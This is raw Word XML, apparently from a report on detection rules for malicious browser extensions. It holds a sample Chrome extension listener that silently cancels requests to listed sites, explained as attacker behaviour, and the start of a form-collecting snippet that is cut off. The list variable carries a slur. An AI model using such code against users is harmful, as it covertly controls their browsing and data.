                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>[i]) &gt; -</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="6897BB"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>1</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>) {</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b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t xml:space="preserve">return </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color w:val="9876AA"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>cancel</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t xml:space="preserve">: </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>true</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">            </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CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">         </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color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t xml:space="preserve">, </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color w:val="9876AA"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>urls</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>: [</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="6A8759"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>"&lt;all_urls&gt;"</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color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t xml:space="preserve">, </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6A8759"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>"blocking"</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CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="72CA8DCD" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRPr="007652E7" w:rsidRDefault="006A6E3D" w:rsidP="007652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2"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="66F1FA45" w14:textId="31BAAE2A" w:rsidR="006A6E3D" w:rsidRPr="007652E7" w:rsidRDefault="006A6E3D">
                            <w:pPr>
                              <w:rPr>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494BB0" id="_x0000_s1035" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:-.45pt;margin-top:44.25pt;width:468.75pt;height:182.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" filled="f" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="61B843CB" w14:textId="674F9315" w:rsidR="006A6E3D" w:rsidRPr="007652E7" w:rsidRDefault="006A6E3D" w:rsidP="007652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CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                      </w:pPr>
                      <w:proofErr w:type="spellStart"/>
                      <w:proofErr w:type="gramStart"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>chrome.webRequest.onBeforeRequest</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/>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FFC66D"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>addListener</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>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b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>function</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>(details) {</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b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve">var </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>url</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> = details.url</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">      </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>for</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b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve">var </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>i</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> = </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="6897BB"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>0</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve">; </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>i</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> &lt; </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>ibneler.</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="9876AA"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>length</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve">; </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>i</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>++) {</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b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>if</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>(</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>url.</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="FFC66D"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>indexOf</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>(</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>ibneler.</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="9876AA"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>length</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>[</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>i</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>]) &gt; -</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="6897BB"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>1</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>) {</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b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve">return </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color w:val="9876AA"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>cancel</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve">: </w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>true</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">            </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CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">         </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color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve">, </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A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">      </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="9876AA"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>urls</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>: [</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>"&lt;</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>all_urls</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>&gt;"</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A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">   }</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve">, </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6A8759"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>"blocking"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>])</w:t>
                      </w:r>
                      <w:r w:rsidRPr="007652E7">
                        <w:rPr>
                          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="72CA8DCD" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRPr="007652E7" w:rsidRDefault="006A6E3D" w:rsidP="007652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2"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="66F1FA45" w14:textId="31BAAE2A" w:rsidR="006A6E3D" w:rsidRPr="007652E7" w:rsidRDefault="006A6E3D">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00F66EC0" w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>Rule 6: Block access to websites.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="188"/>
    </w:p>
    <w:p w14:paraId="6B71E580" w14:textId="3237534F" w:rsidR="001175B2" w:rsidRPr="009E02A4" w:rsidRDefault="009E02A4" w:rsidP="009E02A4">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="189" w:name="_Ref514844067"/>
      <w:bookmarkStart w:id="190" w:name="_Toc523071584"/>
      <w:r w:rsidRPr="009E02A4">
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="009E02A4">
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="006A6E3D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>12</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="009E02A4">
        <w:t>: Access to websites blocked.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="189"/>
      <w:bookmarkEnd w:id="190"/>
    </w:p>
    <w:p w14:paraId="0B7E3F69" w14:textId="77777777" w:rsidR="00F66EC0" w:rsidRPr="00F66EC0" w:rsidRDefault="00F66EC0" w:rsidP="001175B2">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve">This rule detects whether the extension prevents the user from accessing specific websites. In this case, the attacker uses a listener for the URLs the user visits and blocks the access to them. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="055365CE" w14:textId="32991CB8" w:rsidR="00F66EC0" w:rsidRDefault="00F66EC0" w:rsidP="00F66EC0">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36EF80DB" w14:textId="1D2F2C60" w:rsidR="007652E7" w:rsidRDefault="007652E7" w:rsidP="00F66EC0">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35C6180C" w14:textId="77777777" w:rsidR="007652E7" w:rsidRPr="00F66EC0" w:rsidRDefault="007652E7" w:rsidP="00F66EC0">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6B754E53" w14:textId="77777777" w:rsidR="00F66EC0" w:rsidRPr="00F66EC0" w:rsidRDefault="00F66EC0" w:rsidP="00F66EC0">
      <w:pPr>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:bookmarkStart w:id="191" w:name="_Toc523071520"/>
    <w:p w14:paraId="0E4AB2BA" w14:textId="2821665D" w:rsidR="001175B2" w:rsidRDefault="007652E7" w:rsidP="00F66EC0">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251682816" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="0A100AD0" wp14:editId="6CFC598D">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>4445</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>480060</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="6038850" cy="318135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3181350"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="2FCA1B47" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRDefault="006A6E3D" w:rsidP="007652E7">
                            <w:pPr>
                              <w:pStyle w:val="HTMLPreformatted"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                              <w:rPr>
                                <w:color w:val="808080"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="808080"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>//get every form</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="808080"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">var </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>forms = document.forms</w:t>
                            </w:r>
